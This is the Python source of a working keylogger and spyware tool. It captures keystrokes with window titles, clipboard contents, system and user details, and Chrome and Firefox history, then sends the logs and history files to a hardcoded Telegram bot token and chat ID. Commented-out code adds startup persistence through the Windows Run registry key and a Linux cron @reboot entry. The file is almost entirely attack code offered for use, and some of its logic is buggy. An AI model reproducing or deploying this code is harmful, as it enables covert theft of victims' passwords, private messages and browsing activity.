import os
import time
from pynput.keyboard import Listener
from pynput.mouse import Listener as MouseListener
from datetime import datetime
import threading
import requests
import platform
import socket
import psutil
import pyperclip
import sqlite3 
import sys

# Global Variables
log_file = "systemlogs.txt"
chrome_file = "chrome_history.txt"
firefox_file = "firefox_history.txt"
BOT_TOKEN = "7900511626:AAGG0N10TMLAqCD6_oZcmVINc0_CIqKS9f4"
CHAT_ID = "5854515205"


# get user details
def get_user_details():
    try:
        # Get the logged-in user
        if platform.system() == "Windows":
            user_name = os.getlogin()
        else:
            import pwd
            user_name = pwd.getpwuid(os.geteuid())[0]  # This gets the user from the current UID
    except Exception as e:
        print(f"Error retrieving user name: {e}")
        user_name = "Unknown"
    
    home_directory = os.path.expanduser('~')  # User's home directory
    
    # Get operating system details
    os_name = platform.system()
    os_version = platform.version()
    
    # Get machine details
    machine_name = platform.node()
    architecture = platform.architecture()

    # Get IP address
    ip_address = socket.gethostbyname(socket.gethostname())

    # Get system details
    cpu_info = psutil.cpu_percent(interval=1)
    memory_info = psutil.virtual_memory()

    user_details = (
        f"Logged-in User: {user_name}\n"
        f"Operating System: {os_name} {os_version}\n"
        f"Machine Name: {machine_name}\n"
        f"Architecture: {architecture}\n"
        f"Home Directory: {home_directory}\n"
        f"IP Address: {ip_address}\n"
        f"CPU Usage: {cpu_info}%\n"
        f"Memory Usage: {memory_info.percent}%\n"
    )

    return user_details

if __name__ == "__main__":
    get_user_details()

# clipboard
def get_clipboard_content():
    try:
        clipboard_content = pyperclip.paste()
        print("Clipboard content :", clipboard_content) # check
        return clipboard_content
    except Exception as e:
        print(f"Error accessing clipboard: {e}")
        return None
    
# Log clipboard content
def log_clipboard():
    clipboard_content = get_clipboard_content()
    if clipboard_content:
        with open(log_file, "a") as log_file_obj:
            log_file_obj.write(f"\n[{datetime.now()}] Clipboard: {clipboard_content}\n")
# Add a periodic task to log clipboard content
def periodic_clipboard_log():
    while True:
        print("Printing clipboard...")
        time.sleep(150)  # Delay between checks
        log_clipboard()

# MOUSE LOGGING--------------------------------------------------------------------------------------------------------------------------------------
# # Function to log mouse clicks
# def log_mouse_click(x, y, button, pressed):
#     try:
#         with open(log_file, "a") as log_file_obj:
#             if pressed:
#                 log_file_obj.write(f"[{datetime.now()}] Mouse clicked at ({x}, {y}) with {button}\n")
#             else:
#                 log_file_obj.write(f"[{datetime.now()}] Mouse released at ({x}, {y}) with {button}\n")
#     except Exception as e:
#         print(f"Error logging mouse click: {e}")

# # Function to log mouse scrolls
# def log_mouse_scroll(x, y, dx, dy):
#     try:
#         with open(log_file, "a") as log_file_obj:
#             log_file_obj.write(f"[{datetime.now()}] Mouse scrolled at ({x}, {y}) with delta ({dx}, {dy})\n")
#     except Exception as e:
#         print(f"Error logging mouse scroll: {e}")
# # Function to start mouse listener
# def start_mouse_listener():
#     with MouseListener(on_click=log_mouse_click, on_scroll=log_mouse_scroll) as listener:
#         listener.join()


# --------------------------------------------------------------------------------------------
# Function to get History of the browsers
def get_chrome_history_windows():
    try:
        app_data_path = os.getenv('APPDATA')  # Get AppData path
        chrome_history_path = os.path.join(app_data_path, r"Local\Google\Chrome\User Data\Default\History")
        
        if os.path.exists(chrome_history_path):
            connection = sqlite3.connect(chrome_history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls")
            history = cursor.fetchall()
            connection.close()
            return history
        else:
            return []
    except Exception as e:
        print(f"Error accessing Chrome history: {e}")
        return []

def get_firefox_history_windows():
    try:
        app_data_path = os.getenv('APPDATA')  # Get AppData path
        firefox_profile_path = os.path.join(app_data_path, r"Roaming\Mozilla\Firefox\Profiles")
        
        if os.path.exists(firefox_profile_path):
            for profile in os.listdir(firefox_profile_path):
                places_db_path = os.path.join(firefox_profile_path, profile, "places.sqlite")
                if os.path.exists(places_db_path):
                    connection = sqlite3.connect(places_db_path)
                    cursor = connection.cursor()
                    cursor.execute("SELECT url, title, last_visit_date FROM moz_places")
                    history = cursor.fetchall()
                    connection.close()
                    return history
                else:
                    return []
        else:
            return []
    except Exception as e:
        print(f"Error accessing Firefox history: {e}")
        return []

def get_chrome_history_linux():
    try:
        home_dir = os.getenv('HOME')  # Get home directory
        chrome_history_path = os.path.join(home_dir, ".config", "google-chrome", "Default", "History")
        
        if os.path.exists(chrome_history_path):
            connection = sqlite3.connect(chrome_history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls")
            history = cursor.fetchall()
            connection.close()
            return history
        else:
            return []
    except Exception as e:
        print(f"Error accessing Chrome history: {e}")
        return []

def get_firefox_history_linux():
    try:
        home_dir = os.getenv('HOME')  # Get home directory
        firefox_profile_path = os.path.join(home_dir, ".mozilla", "firefox")
        
        if os.path.exists(firefox_profile_path):
            for profile in os.listdir(firefox_profile_path):
                if profile.endswith(".default-release") or profile.endswith(".default"):
                    places_db_path = os.path.join(firefox_profile_path, profile, "places.sqlite")
                    if os.path.exists(places_db_path):
                        connection = sqlite3.connect(places_db_path)
                        cursor = connection.cursor()
                        cursor.execute("SELECT url, title, last_visit_date FROM moz_places")
                        history = cursor.fetchall()
                        connection.close()
                        return history
                    else:
                        return []
            else:
                return []
        else:
            return []
    except Exception as e:
        print(f"Error accessing Firefox history: {e}")
        return []


def write_history_to_file(history, filename):
    with open(filename, "w") as file:
        for entry in history:
            file.write(f"URL: {entry[0]}\n")
            file.write(f"Title: {entry[1]}\n")
            file.write(f"Last Visited: {entry[2]}\n\n")


if __name__ == "__main__":
    print("Accessing browser history...")

    if platform.system() == "Windows":
        chrome_history = get_chrome_history_windows()
        firefox_history = get_firefox_history_windows()
    elif platform.system() == "Linux":
        chrome_history = get_chrome_history_linux()
        firefox_history = get_firefox_history_linux()
    else:
        print("Unsupported OS.")

    # Write browser history to a file
    write_history_to_file(chrome_history, "chrome_history.txt")
    write_history_to_file(firefox_history, "firefox_history.txt")


# send the history files
def send_chrome_history(chrome_file):
    try:
        if os.path.exists(chrome_file) and os.path.getsize(chrome_file) > 0:
            with open(chrome_file, "rb") as file:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                files = {"document": file}
                data = {"chat_id": CHAT_ID, "caption": "Chrome History"}
                response = requests.post(url, data=data, files=files)
                if response.status_code == 200:
                    print("Chrome File sent")
                else:
                    print(f"Failed to send chrome file. Response : {response.status_code}, {response.text}")
        else:
            print("Chrome file is empty. Skipping send.")
    except Exception as e:
        print(f"Error sending chrome file: {e}")
def send_firefox_history(firefox_file):
    try:
        if os.path.exists(firefox_file) and os.path.getsize(firefox_file) > 0:
            with open(chrome_file, "rb") as file:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                files = {"document": file}
                data = {"chat_id": CHAT_ID, "caption": "Chrome History"}
                response = requests.post(url, data=data, files=files)
                if response.status_code == 200:
                    print("Chrome File sent")
                else:
                    print(f"Failed to send chrome file. Response : {response.status_code}, {response.text}")
        else:
            print("Chrome file is empty. Skipping send.")
    except Exception as e:
        print(f"Error sending chrome file: {e}")

def send_history_files():
    # sending history files
    i=0
    while i == 0:
        time.sleep(5)
        send_chrome_history(chrome_file)
        i = 1
    j=0
    while i == 0:
        send_firefox_history(firefox_file)
        j = 1
#--------------------------------------------------------------------------------------------------------------







# Import platform-specific libraries
if platform.system() == "Windows":
    import pygetwindow as gw
elif platform.system() == "Linux":
    import Xlib
    import subprocess



# To track the last active window
last_window = None

# Function to get the current active window (cross-platform)
def get_active_window():
    current_window = "Unknown Window"
    
    if platform.system() == "Windows":
        # On Windows, use pygetwindow to get the active window
        active_window = gw.getActiveWindow()
        if active_window:
            current_window = active_window.title
    elif platform.system() == "Linux":
        # On Linux, use Xlib to get the active window
        display = Xlib.display.Display()
        window_id = display.get_input_focus().focus
        window = display.create_resource_object('window', window_id)
        current_window = window.get_wm_name()
        
    return current_window


# Log keystrokes
def log_key(key):
    user_details = get_user_details()
    # Log the user details at the start of the file if it's empty or at each keypress
    with open(log_file, "a") as log_file_obj:
        if os.path.getsize(log_file) == 0:  # If the file is empty, log the details first
            log_file_obj.write(f"\n[{datetime.now()}] User Details:\n{user_details}\n")

    global last_window
    current_window = get_active_window()

    # log the window name if it has not changed
    if current_window != last_window:
        with open(log_file, "a") as log_file_obj:
            log_file_obj.write(f"\n[{datetime.now()}] Active Window: { current_window}\n")
        last_window = current_window
    # logging the keypress
    try:
        with open(log_file, "a") as log_file_obj:
            log_file_obj.write(f"{datetime.now()} : \t")
            log_file_obj.write(f"{key.char}\n")
    except AttributeError:  # Special keys (like Enter, Backspace, etc.)
        with open(log_file, "a") as log_file_obj:
            log_file_obj.write(f"{datetime.now()} : \t{key}\n")
    except Exception as e:
        print(f"Error logging key: {e}")

# Send the log file via Telegram Bot
def send_file(log_file):
    try:
        if os.path.exists(log_file) and os.path.getsize(log_file) > 0:
            with open(log_file, "rb") as file:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                files = {"document": file}
                data = {"chat_id": CHAT_ID, "caption": "Keylogger logs"}
                response = requests.post(url, data=data, files=files)
                if response.status_code == 200:
                    print("File sent successfully via Telegram.")
                else:
                    print(f"Failed to send file. Response: {response.status_code}, {response.text}")
        else:
            print("Log file is empty. Skipping send.")
    except Exception as e:
        print(f"Error sending file: {e}")





# Clear the log file
def clear_log_file():
    try:
        with open(log_file, "w") as file:
            file.write("")  # Clear the contents
        print("Log file cleared.")
    except Exception as e:
        print(f"Error clearing log file: {e}")

# Periodic sending and clearing
def periodic_send_and_clear():
    while True:
        time.sleep(30)  # Wait for 5 minutes
        if send_file(log_file):  # Attempt to send the file
            clear_log_file()  # Clear the file only if sending was successful
        else:
            print("File not cleared due to send failure.")


# Persistence-------------------------------------------------------------------------------------------------------------------------------------
# def add_to_persistence():
#     if platform.system() == "Windows":
#         try:
#             import winreg as reg
#             # Registry key for startup programs
#             key = r"Software\Microsoft\Windows\CurrentVersion\Run"
#             value_name = "KeyboardAdapter"  # Name of the registry key
#             # Use the current executable path if frozen (PyInstaller) or the script path otherwise
#             script_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            
#             # Add the key to the registry
#             with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE) as registry_key:
#                 reg.SetValueEx(registry_key, value_name, 0, reg.REG_SZ, script_path)
#             print("Keylogger added to Windows startup successfully!")
#         except Exception as e:
#             print(f"Error adding to Windows startup: {e}")

#     elif platform.system() == "Linux":
#         try:
#             # Path to the Python script or executable
#             script_path = os.path.abspath(__file__)
#             cron_command = f"@reboot /usr/bin/python3 {script_path}"

#             # Check if the cron job already exists
#             existing_crons = subprocess.run("crontab -l", shell=True, capture_output=True, text=True)
#             if cron_command in existing_crons.stdout:
#                 print("Cron job already exists.")
#                 return

#             # Add the new cron job
#             new_crons = existing_crons.stdout.strip() + f"\n{cron_command}\n"
#             subprocess.run(f'echo "{new_crons}" | crontab -', shell=True, text=True)
#             print("Keylogger added to Linux cron successfully!")
#         except Exception as e:
#             print(f"Error adding to Linux cron: {e}")

#     else:
#         print("Unsupported operating system for persistence.")










# Main function to start the keylogger and periodic sender
def main():
    try:
        # Start clipboard logging in a separate thread
        clipboard_thread = threading.Thread(target=periodic_clipboard_log, daemon=True)
        clipboard_thread.start()

        # Start the periodic sender in a separate thread
        sender_thread = threading.Thread(target=periodic_send_and_clear, daemon=True)
        sender_thread.start()

        # Start the history file sender in a separate thread
        history_sender_thread = threading.Thread(target=send_history_files, daemon=True)
        history_sender_thread.start()


        # Start the mouse listener in a separate thread
        # mouse_thread = threading.Thread(target=start_mouse_listener, daemon=True)
        # mouse_thread.start()


        # Start the keylogger
        with Listener(on_press=log_key) as listener:
            listener.join()
    except Exception as e:
        print(f"Error in main function: {e}")

if __name__ == "__main__":
    # add_to_persistence()
    print("Keylogger started. Logs will be sent every 5 minutes.")
    main()



# does not have persistence